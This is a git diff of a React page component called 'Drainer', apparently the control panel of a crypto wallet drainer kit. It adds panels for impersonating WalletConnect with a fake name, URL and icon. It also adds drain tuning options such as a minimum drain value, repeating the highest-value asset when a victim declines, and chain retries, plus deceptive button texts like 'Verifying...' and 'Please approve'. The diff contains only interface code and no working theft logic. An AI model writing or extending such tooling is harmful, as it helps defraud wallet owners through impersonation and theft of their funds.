@@ -11,8 +11,8 @@ import Checkbox from "@/components/Input/checkbox";
 export default function Drainer() {
   return (
     <Layout>
-      <div className="w-full h-auto p-4 grid grid-cols-7 items-start gap-4">
-        <div className="col-span-4 flex flex-col justify-start gap-4">
+      <div className="w-full h-auto p-4 grid grid-cols-9 items-start gap-4">
+        <div className="col-span-5 flex flex-col justify-start gap-4">
           <div className="w-full h-auto bg-[#0C091A] py-3 px-5 rounded-xl">
             <AccordionCollapse title="Misc Settings">
               <div className="grid grid-cols-2 gap-y-4 gap-x-8">
@@ -188,7 +188,131 @@ export default function Drainer() {
             </AccordionCollapse>
           </div>
         </div>
-        {/* <div className="col-span-2 bg-white w-full h-auto ">as</div> */}
+
+        <div className="col-span-3 flex flex-col gap-4  w-full h-auto ">
+          <div className="w-full h-auto bg-[#140E2D] py-3 px-5 rounded-xl">
+            <AccordionCollapse title="Impersinate Settings">
+              <div className="w-full h-auto  flex justify-between items-center">
+                <span className="text-[#F5F5F5] text-sm font-normal">
+                  Impersanate WalletConnect
+                </span>
+                <Checkbox id={"checkbox11"} checked={false} />
+              </div>
+              <div className="w-full h-auto my-4 flex flex-col justify-start items-start gap-2">
+                <ButtonField
+                  id={"Name"}
+                  placeholder="Input"
+                  title="Name"
+                  value={""}
+                />
+                <ButtonField
+                  id={"Descriprion"}
+                  placeholder="Input"
+                  title="Descriprion"
+                  value={""}
+                />
+                <ButtonField
+                  id={"URL"}
+                  placeholder=""
+                  title="URL"
+                  value={"Add this code in any place on page to"}
+                />
+                <ButtonField
+                  id={"Icon"}
+                  placeholder=""
+                  title="Icon"
+                  value={"Add this code in any place on page to"}
+                />
+              </div>
+            </AccordionCollapse>
+          </div>
+
+          <div className="w-full h-auto bg-[#140E2D] py-3 px-5 rounded-xl">
+            <AccordionCollapse title="Drain Settings">
+              <div className="w-full h-auto flex flex-col gap-2">
+                <div className="w-full h-auto  flex justify-between items-center">
+                  <span className="text-[#F5F5F5] text-sm font-normal">
+                    Display Modal On Loading
+                  </span>
+                  <Checkbox id={"checkbox12"} checked={false} />
+                </div>
+                <div className="w-full h-auto  flex justify-between items-center">
+                  <span className="text-[#F5F5F5] text-sm font-normal">
+                    Repeat Highest Asset On Decline
+                  </span>
+                  <Checkbox id={"checkbox13"} checked={false} />
+                </div>
+              </div>
+              <div className="w-full h-auto my-4 flex flex-col justify-start items-start gap-2">
+                <ButtonField
+                  id={"Chain Tries"}
+                  placeholder=""
+                  title="Chain Tries"
+                  value={3}
+                />
+                <ButtonField
+                  id={"Minimal Drain Value"}
+                  placeholder=""
+                  title="Minimal Drain Value"
+                  value={"002"}
+                />
+                <ButtonField
+                  id={"Progress"}
+                  placeholder=""
+                  title="Progress"
+                  value={"Verifying..."}
+                />
+              </div>
+            </AccordionCollapse>
+          </div>
+
+
+          <div className="w-full h-auto bg-[#140E2D] py-3 px-5 rounded-xl">
+            <AccordionCollapse title="Buttons Settings">
+                <div className="w-full h-auto  flex justify-between items-center">
+                  <span className="text-[#F5F5F5] text-sm font-normal">
+                  Messages On Button
+                  </span>
+                  <Checkbox id={"checkbox14"} checked={false} />
+                </div>
+
+              <div className="w-full h-auto my-4 flex flex-col justify-start items-start gap-2">
+                <ButtonField
+                  id={"Message Element ID"}
+                  placeholder=""
+                  title="Message Element ID"
+                  value={"messageButton"}
+                />
+                <ButtonField
+                  id={"Initial"}
+                  placeholder=""
+                  title="Initial"
+                  value={"Loading..."}
+                />
+                <ButtonField
+                  id={"Progress"}
+                  placeholder=""
+                  title="Progress"
+                  value={"Verifying..."}
+                />
+                <ButtonField
+                  id={"Success"}
+                  placeholder=""
+                  title="Success"
+                  value={"Please approve"}
+                />
+                <ButtonField
+                  id={"Failed"}
+                  placeholder=""
+                  title="Failed"
+                  value={"Try again"}
+                />
+              </div>
+            </AccordionCollapse>
+          </div>
+
+
+        </div>
       </div>
     </Layout>
   );
